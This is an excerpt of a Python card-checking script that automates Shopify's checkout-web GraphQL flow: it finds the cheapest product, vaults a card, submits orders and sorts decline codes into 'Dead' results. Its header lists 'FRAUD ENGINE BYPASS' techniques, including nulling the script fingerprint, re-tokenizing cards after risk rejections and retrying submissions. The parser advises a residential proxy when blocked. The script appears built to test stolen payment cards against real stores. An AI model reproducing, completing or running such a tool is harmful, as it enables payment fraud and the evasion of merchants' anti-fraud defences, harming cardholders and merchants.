# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Shopify Checkout Core v3.0 — New Checkout-Web GQL Flow (Restored + Fixed)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# NOTE: Legacy form-based flow REMOVED — ALL Shopify stores use checkout-web
# since Aug 2024. Form POSTs to /checkouts/{token} return 405 Method Not Allowed.
# This is the ONLY working flow for all modern Shopify stores.
#
# FLOW (new checkout-web GraphQL via /checkouts/unstable/graphql):
#   1. GET  /products.json               → cheapest physical product
#   2. GET  homepage                     → Storefront accessToken
#   3. POST /api/unstable/graphql.json   → cartCreate → checkoutUrl
#   4. GET  checkoutUrl                  → sessionToken (serialized meta tag)
#   5-8. POST /checkouts/unstable/graphql → Negotiate rounds (buyer/merch/delivery)
#   9. POST checkout.pci.shopifyinc.com  → vault card → payment_token
#  10. POST /checkouts/unstable/graphql  → Negotiate with payment (+ fraud poll)
#  11. POST /checkouts/unstable/graphql  → submitForCompletion
#  12. POST /checkouts/unstable/graphql  → PollForReceipt
#
# FRAUD ENGINE BYPASS:
#   - cartCreate via Storefront API ensures sessionToken IS in HTML (meta tags)
#   - Without cartCreate, /checkouts/cn/* returns no sessionToken → Unauthorized
#   - caller_id_sig (Shopify-Identification-Signature) binds PCI token to session
#   - scriptFingerprint = null/empty → prevents REQUIRED_ARTIFACTS_UNAVAILABLE
#   - Artifacts poll loop (10x, 1.2s each) waits for Shopify risk scores
#   - Re-tokenize card after ARTIFACT_DISSATISFACTION
#   - SubmitRejected retry with server-corrected delivery lines + stableIds
#   - payment_method_identifier normalized to credit_card
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
...
def extract_clean_response(message: str) -> str:
    ...
    # IP / Gateway block codes → clear user-facing message
    _IP_BLOCK = {
        'PAYMENTS_PROPOSED_GATEWAY_UNAVAILABLE',
        'REQUIRED_ARTIFACTS_UNAVAILABLE',
        'ARTIFACT_DISSATISFACTION',
    }
    _upper = message.strip().upper()
    if _upper in _IP_BLOCK or any(c in message.upper() for c in _IP_BLOCK):
        return 'Dead [IP Block - Use Residential Proxy]'


    _KNOWN_CODES = {
        'CARD_DECLINED', 'INSUFFICIENT_FUNDS', 'EXPIRED_CARD', 'INVALID_CVC',
        'INCORRECT_NUMBER', 'INCORRECT_CVC', 'INCORRECT_ZIP', 'INCORRECT_ADDRESS',
        'PROCESSING_ERROR', 'CALL_ISSUER', 'PICK_UP_CARD',  # Dead - generic bank decline 'DO_NOT_HONOR',
...
def tokenize_card_legacy(cc, month, year, cvv, session, profile):
    """Alias for tokenize_card (backward compat with api.py / external callers)."""
    return tokenize_card(cc, month, year, cvv, session, profile)
